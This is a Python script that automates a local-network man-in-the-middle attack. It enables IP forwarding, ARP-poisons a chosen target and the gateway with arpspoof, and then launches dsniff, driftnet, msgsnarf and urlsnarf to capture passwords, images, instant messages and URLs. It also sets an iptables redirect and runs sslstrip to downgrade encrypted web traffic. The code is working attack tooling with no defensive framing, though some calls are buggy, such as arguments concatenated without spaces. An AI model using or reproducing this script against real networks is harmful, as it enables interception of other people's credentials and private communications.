import os
import sys
import socket
import struct
import time
import subprocess
from scapy.all import *
conf.verb=0
##############
### CONFIG ###
##############
# Edit these values... Eventually these will autoconfigure... 
airmonpath = "/usr/local/sbin/airmon-ng"
#airmonpath = "os.popen("which airmon-ng")" # if someone can make this work? It would be epic :)


################
# STOP EDITING #
################

# Function: amiroot()
def amiroot():
    if os.geteuid() != 0:
        print("[-] You are not root... Sudo may be of some assistance!")
        sys.exit(1)
    else:
        pass

# Function: check_airmon()
def check_airmon(airmonpath):
    if os.path.isfile(airmonpath) == True:
        print("[*] Airmon-ng is installed! This is fine...")
    else:
        print("[-] Airmon-ng not found, quitting!")
	sys.exit(1)

# Function: get_ifaces() This works in 3
def get_ifaces():
        airmon = os.popen("airmon-ng")
        ifacelst = airmon.readlines()
        li=0
        for line in ifacelst:
                line = line.replace("Interface\tChipset\t\tDriver","")
                line = line.strip()
                inum = li + 1
                if line:
                        line = line.split("\t\t")
                        print (line[0])
                        ifaces = line[0]
                        return ifaces

# Function: ip_forwarding() 
def ip_forwarding():
    try:
        os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward") # Enable IP forwarding
        ipout = open("/proc/sys/net/ipv4/ip_forward" , "r").read() # Checks is it enabled
        time.sleep(1)
        if ipout[0] == '1':
            print("[+] IP forwarding enabled")
        else:
            print("[-] Something fucked up, forwarding not enabled!")
            ipout.close()
    except Exception:
        pass

# Function: Get Gateway
def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

# Function: makerange(), gets gateway, returns the range
def makerange(gwaddr):
    SIP=gwaddr.split('.')
    iprange = SIP[0] + '.' + SIP[1] + '.' + SIP[2] + '.0/24'
    return iprange

# ARP scanner function goes here that gets list of possible targets...
#def arpscan(scanrange):
#    ans,unans=srp(Ether()/ARP(pdst=scanrange),timeout=0.5,inter=0.1)
#    for snd,rcv in ans:
#        print rcv.sprintf("%Ether.src% & %ARP.psrc%")

# Faster ARP scanner, currently disabled as it is "crashy".
#def arpscan(scanrange):
#    arping("scanrange")

# Function: Arppoison
def arppoison(iface, target, gwaddr):
    print("[+] Preparing the ARP Poisoning Suite")
    print("[*]Targetted gateway is " + gwaddr) # Verbosity
    print("[*] Targetted user is " + target) # More verbosity
    print("[*] Interface in use is " + iface) # Even more verbosity :D
    os.popen("arpspoof -i " + iface + " -t " + target + gwaddr + " & >/dev/null")
    print("[+] Poisoning them bastards")
    os.popen("arpspoof -i " + iface + " -t " + gwaddr + target + "  & >/dev/null")

# Function: Dsniff
def launch_dsniff(iface):
    choose = raw_input("[?] Launch DSNIFF to sniff passwords? (y/n) ")
    if choose == "n":
        print("[+] dsniff not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching Dsniff in background!")
            os.popen("xterm -e dsniff -i " + iface + " &")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: Driftnet
def launch_driftnet(iface):
    choose = raw_input("[?] Launch Driftnet to sniff images? (y/n) ")
    if choose == "n":
        print("[+] Driftnet not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching Driftnet in background!")
            os.popen("xterm -e driftnet -i " + iface + " &")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: MsgSnarf
def launch_msgsnarf(iface):
    choose = raw_input("[?] Launch MsgSnarf to sniff instant messages? (y/n) ")
    if choose == "n":
        print("[+] MsgSnarf not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching MsgSnarf in background!")
            os.popen("xterm -e msgsnarf -i " + iface + " &")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: UrlSnarf
def launch_urlsnarf(iface):
    choose = raw_input("[?] Launch URLSnarf to sniff URL's? (y/n) ")
    if choose == "n":
        print("[+] URLSnarf not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching URLSarf in background!")
            os.popen("xterm -e urlsnarf -i " + iface + " &")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: SSLSTRIP
def launch_sslstrip():
    choose = raw_input("[?] Launch SSLStrip to sniff SSL data? (y/n) ")
    if choose == "n":
        print("[+] SSLStrip not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Setting IPTables NAT rulesets")
            subprocess.call('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', shell=True)
            print("[+] Launching SSLStrip in background!")
            os.popen("xterm -e sslstrip -a &")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# THIS PART DOES SHIT!
print("Starting up!!!")
amiroot()
check_airmon(airmonpath)
print("[*] These are the interfaces available to you")
get_ifaces()
iface = raw_input("what interface are you using (eg: wlan0): ") # Sets the interface to fuck with...
print("[*] Using interface " + iface)
ip_forwarding()
gwaddr = get_default_gateway_linux()
print("[*] Gateway address: " + gwaddr)
scanrange = makerange(gwaddr)
print("[+] Range to scan is: " + scanrange)
arping("scanrange") # should be a far faster scanner. If it breaks just uncomment the one above :)
#arpscan(scanrange)
target = raw_input("Please Select a Target: ")
arppoison(iface, target, gwaddr)
launch_dsniff(iface)
launch_driftnet(iface)
launch_msgsnarf(iface)
launch_urlsnarf(iface)
launch_sslstrip()
